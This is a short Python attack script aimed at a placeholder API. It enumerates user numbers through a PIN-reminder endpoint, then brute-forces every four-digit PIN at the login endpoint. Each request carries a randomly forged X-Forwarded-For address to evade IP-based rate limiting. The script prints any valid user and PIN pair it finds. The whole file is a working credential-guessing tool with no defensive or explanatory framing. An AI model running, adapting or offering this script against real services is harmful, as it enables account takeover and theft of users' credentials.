import requests
from faker import Faker


fake = Faker()

def enum():
	
	user_number = '0'
	url = 'https://api.company.com/'
	headerlist = {'Host': 'api.company.com', 'Accept': 'application/json, text/plain, */*', 'Content-Length': '0', 'Accept-Encoding': 'gzip, deflate, br', 'User-Agent': 'UserAgentHere', 'X-Forwarded-For': fake.ipv4_public()}

	for i in range(0,9999999):
		user_number = str(i).zfill(7)
		endpoint = 'endpoint/user/' + user_number + '/pin-reminder'
		headerlist.update({'X-Forwarded-For':fake.ipv4_public()})
		x = requests.post(url+endpoint, headers = headerlist)
		if '*' in x.text:
			print('Success! User Number is: ', user_number)
			return user_number
		print('Current User Number: ', user_number, 'Result: ', x.text)

def bruteforce(user_number):
	
	url = 'https://api.company.com/'
	headerlist = {'Host': 'api.company.com', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'User-Agent': 'UserAgentHere', 'X-Forwarded-For': fake.ipv4_public()}

	datalist = {'user_code':user_number,'pin':'0000'}

	endpoint = 'endpoint/user/authenticate'

	for i in range(0,9999):
		headerlist.update({'X-Forwarded-For':fake.ipv4_public()})
		datalist.update({'pin':str(i).zfill(4)})
		x = requests.post(url+endpoint, json = datalist, headers = headerlist)
		print('Current Pin: ', str(i).zfill(4), 'Result: ', x.text)
		if 'id' in x.text:
			print('Found valid creds!', user_number, ':', str(i).zfill(4))
			return 0
		
		
		
user_number = enum()
bruteforce(user_number)
